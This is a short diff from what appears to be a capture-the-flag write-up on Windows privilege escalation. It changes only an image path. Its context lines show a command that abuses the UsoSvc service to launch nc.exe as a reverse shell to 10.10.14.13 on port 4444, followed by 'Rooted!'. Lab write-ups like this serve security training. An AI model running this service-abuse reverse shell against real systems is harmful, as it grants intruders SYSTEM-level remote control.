@@ -216,6 +216,6 @@ We have control over the `UsoSvc` service. With this, we can run commands as the
 <strong>Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command 'C:\Windows\Tasks\nc.exe 10.10.14.13 4444 -e cmd.exe'
 </strong></code></pre>
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (5).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
